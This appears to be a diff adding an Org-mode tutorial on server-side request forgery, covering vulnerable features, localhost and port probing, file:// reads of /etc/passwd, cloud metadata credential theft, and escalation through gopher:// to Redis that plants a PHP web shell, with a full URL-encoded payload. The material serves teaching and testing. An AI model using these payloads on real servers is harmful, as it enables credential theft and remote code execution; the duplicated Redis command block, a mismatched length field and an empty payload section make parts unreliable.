@@ -1,1 +1,339 @@
 #+title: Server Side Request Forgery
+#+author: gabriel
+
+* intro
+Server-side request forgery (SSRF) is a web security vulnerability that allows on attacker to trick a target server into sending requests on their behalf, or making it act as the server itself, to other systems.
+
+Fundamentally, it occurs when the application server fetches data from a URL or resource that a user can control, and fails to properly validade this input.
+
+An attacker can use this vulnerability
+
+An attacker can use this vulnerability to make the server send requests to internal network resources that it should not normally have access to (such as databases, administrative panels, other servers), or to the server's own local file system (localhost).
+
+[[./imgs/ssrf.png]]
+
+SSRF vulnerabilities are extremely dangerous because they can bypass firewalls, VPNs, and other network segmentation controls
+
+* where is SSRF found ?
+SSRF vulnerabilities can arise in any feature that requires the server to make a server-side HTTP request to a URL or address provided by a user.
+
+** importing data from a URL
+Web applications often provide functionality for users to import or upload data via a URL. For example, scenarios like fetching a user's profile picture from a URL
+
+*user-input* ->
+https://example.com/avatar.jpg
+
+*vulnerable parameter* ->
+avatar_url=https://example.com/avatar.jpg
+
+*attack vector* ->
+An attacker could try to access the server's local admin panel by changing this parameter to an internal network address like avatar_url=http://127.0.0.1/admin.
+
+** webhooks
+Webhooks are used to send automated notifications from one application to another when an event occurs.
+
+An e-commerce site sends a notification to its inventory management system via a webhook when a new order is placed.
+
+*user-configured URL* ->
+https://inventory-system.api/notify
+
+*attack vector* ->
+A malicious user could send unauthorized requests to the server's internal services by changing this webhook URL to an address like http://localhost:8080/sensitive-info.
+
+** document and report generator
+Some web applications allow users to generate reports in PDF, Word, or other formats by fetching content from URLs.
+
+For example, a service that takes a snapshot of a web page and saves it as a PDF. These services make server-side requests in the background to "render" the content of the provided URL.
+
+*user-input* ->
+https://my-blog-post.com
+
+*vulnerable parameter* ->
+url_to_convert=https://my-blog-post.com
+
+*attack vector* ->
+An attacker might try to read the server's local files and embed them into the generated PDF by changing the parameter to url_to_convert=file:///etc/hosts.
+
+** backend API calls
+In modern architectures (especially microservices), it is common for one service to communicate with another internal service.
+
+ Sometimes, a parameter from the client is used to determine which service or endpoint to make a request to on the backend.
+
+ An API that checks the stock status of a product. The client sends a product ID and a store ID. The backend uses this store ID to make a request to the stock service of the respective store.
+
+ *request* ->
+ POST /api/stock/check
+
+ *request body* ->
+ { "productId": "12345", "storeApi": "http://stock-api-london.internal/" }
+
+ *attack vector* ->
+ An attacker could attempt to steal credentials by changing the storeApi value to a sensitive internal API address like http://metadata.internal/latest/credentials
+
+* detecting and exploiting SSRF
+The process of detecting and exploiting an SSRF vulnerability typically involves manipulating an input point where the server fetches data from an external source.
+
+** identifying the vulnerable input point
+The first step is to find a parameter in the application where it accepts a URL or IP address from the user and makes a server-side request.
+
+For example, let's assume a website has an image_url parameter that allows loading an image from another URL.
+
+*legitimate url request* ->
+#+begin_src javascript
+GET /loadImage?image_url=https://external-site.com/image.png HTTP/1.1
+Host: vulnerable-site.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+#+end_src
+
+*response* ->
+#+begin_src javascript
+HTTP/1.1 200 OK
+Content-Type: image/png
+Content-Length: 15234
+
+[PNG image data...]
+#+end_src
+
+** basic SSRF test
+The most basic method to test for the vulnerability is to make the server send a request to itself (localhost).
+
+*payload request* ->
+#+begin_src javascript
+GET /loadImage?image_url=http://127.0.0.1/ HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+#+begin_src javascript
+GET /loadImage?image_url=https://google.com HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+*possible response and analysis* ->
+
+*successful response* ->
+The server might return the HTML content of a service running on it (e.g., an Apache "It works!" page or an admin panel login page). This definitively confirms the vulnerability.
+#+begin_src html
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 45
+
+<html><body><h1>It works!</h1></body></html>
+#+end_src
+
+*response* ->
+#+begin_src html
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 45
+
+<html><body><h1>Google</h1></body></html>
+#+end_src
+
+*error messages* ->
+ You might receive errors like "Connection refused" or "Invalid file format". Even these errors can be an indicator of the vulnerability.
+
+ This is because the server tried to connect to localhost but failed, either because the port was closed or the returned content was not in the expected format (e.g., an image).
+
+** scanning the internal network and ports
+Once the vulnerability is confirmed, attackers can scan the internal network where the server resides. This is used to discover other servers, services, and open ports on the internal network.
+
+*payload request* ->
+By trying different port numbers, it's possible to test what other web services are running on the internal network. For example, port 8080 is often used for management panels like Apache Tomcat or Jenkins.
+#+begin_src html
+GET /loadImage?image_url=http://127.0.0.1:8080 HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+*response anaylises* ->
+
+- *Open Port (Web Service)*: If a web service is running on port 8080, the application will likely return some HTML content (e.g., a login page, a "Welcome" page, or a 401/403 error page). Even if the response is an error like "Invalid image format," its content or size will be different from the response for a closed port. This difference indicates that the port is open and used by a service.
+- *Closed Port*: An error like "Connection refused" is received.
+- *Filtered Port*: The request will time out.
+
+** using different url schemes
+SSRF vulnerabilities are not limited to just http:// and https://. Depending on the library used by the server, other URL schemes can also be used.
+
+*reading local files* ->
+This scheme is used to read files on the server's filesystem.
+
+*payload* ->
+: file:///etc/passwd
+
+*request* ->
+: GET /loadImage?image_url=file:///etc/passwd
+
+*Response* ->
+#+begin_src html
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 748
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+#+end_src
+
+*sending complex requests with gopher://* ->
+The gopher:// scheme is used to send raw data over TCP, which makes it extremely powerful. With this scheme, you can send custom commands to many services like Redis, SMTP, or databases.
+
+*example(Sending commands to redis)* ->
+It might be possible to achieve RCE by sending commands to services like Redis, a key-value store. The payload below sends a SET command to Redis.
+
+ Gopher payloads must be URL-encoded, and %0A is used for line breaks.
+
+ *payload* ->
+ : gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a
+
+ *payload explanation* ->
+ The payload above is in the RESP (REdis Serialization Protocol) format used by Redis. When the URL-encoded characters (%0d%0a -> \r\n) are decoded, the payload contains the following commands:
+
+ #+begin_src python
+*3         # Indicates the command consists of 3 parts (SET, key, value)
+$3         # Indicates the first part (SET) is 3 bytes long
+SET        # The command
+$3         # Indicates the second part (key) is 3 bytes long
+key        # The key
+$5         # Indicates the third part (value) is 5 bytes long
+value      # The value
+ #+end_src
+
+The gopher:// scheme sends this raw request directly to port 6379 (the default Redis port) at 127.0.0.1. This makes the web server execute the SET key value command in the Redis database.
+
+The _ character at the beginning of the URL is added as a padding character to prevent clients like curl from skipping the first character.
+: GET /loadImage?image_url=gopher://...
+
+** SSRF in cloud environments
+If the application is running on a cloud platform like AWS, Azure, or Google Cloud, an SSRF vulnerability can be much more dangerous.
+
+*payload* ->
+This service runs at the IP address 169.254.169.254 and contains sensitive information, including temporary security credentials.
+
+*request* ->
+#+begin_src php
+GET /loadImage?image_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+*response* ->
+#+begin_src php
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "Code" : "Success",
+  "LastUpdated" : "2024-08-08T12:00:00Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA...",
+  "SecretAccessKey" : "...",
+  "Token" : "...",
+  "Expiration" : "2024-08-08T18:00:00Z"
+}
+#+end_src
+
+* common SSRF payloads
+The following table lists some basic and advanced SSRF payloads used to achieve different objectives.
+
+These payloads are designed to be injected into a vulnerable parameter, such as http://vulnerable-site.com/page?url=.
+
+* escalating from SSRF to RCE
+Although Server-Side Request Forgery (SSRF) is often seen as an information disclosure and network scanning vulnerability, under certain conditions, it can be a stepping stone to Remote Code Execution (RCE).
+
+** abusing Redis for RCE
+Redis is a fast, in-memory key-value store, often used for caching or session management.
+
+Developers sometimes deploy Redis to be accessible only from the internal network, without any password protection.
+
+ The attacker uses the SSRF vulnerability and the gopher:// URL scheme to send raw commands to the Redis server. The goal is to make Redis save its database as a PHP web shell into a directory accessible by the web server (e.g., /var/www/html).
+
+The attacker crafts a single Gopher payload to send the following Redis commands in sequence:
+- FLUSHALL: Clears the Redis database to get rid of any previous data.
+- SET shell "<?php system($_GET['cmd']); ?>": Creates a key named shell and assigns it a string containing a PHP web shell. For safety in this example, we could use a non-executable string like "<?php echo 'Hello'; ?>".
+- CONFIG SET dir /var/www/html/: Sets the working directory of Redis to the web server's root directory.
+- CONFIG SET dbfilename shell.php: Changes the name of the Redis database backup file to shell.php.
+- SAVE: Triggers Redis to write its current dataset (which includes our PHP shell) to the shell.php file on disk.
+
+** the gopher payload
+This chain of commands must be converted to the RESP (REdis Serialization Protocol) format that Redis understands, and then URL-encoded. Newlines are represented by \r\n (%0d%0a).
+
+First, we prepare the commands we want to send in the Redis protocol format, separated by newlines (\r\n).
+#+begin_src html
+*1
+$8
+FLUSHALL
+*3
+$3
+SET
+$5
+shell
+$32
+
+<?php system($_GET['cmd']); ?>
+
+*4
+$6
+CONFIG
+$3
+SET
+$3
+dir
+$13
+/var/www/html
+*4
+$6
+CONFIG
+$3
+SET
+$10
+dbfilename
+$9
+shell.php
+*1
+$4
+SAVE
+*1
+$8
+FLUSHALL
+*3
+$3
+SET
+$5
+shell
+$32
+
+<?php system($_GET['cmd']); ?>
+
+*4
+$6
+CONFIG
+$3
+SET
+$3
+dir
+$13
+/var/www/html
+*4
+$6
+CONFIG
+$3
+SET
+$10
+dbfilename
+$9
+shell.php
+*1
+$4
+SAVE
+#+end_src
+
+** URL-Encoded Gopher Payload
+The raw commands above are then URL-encoded for use in the Gopher payload. Spaces, special characters, and newlines (%0d%0a) are converted into their corresponding codes.
+
+#+begin_src python
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%245%0D%0Ashell%0D%0A%2432%0D%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A
+#+end_src
+
+When this payload is injected into a vulnerable parameter (e.g., image_url), the server will connect to Redis, execute the commands, and create the web shell.
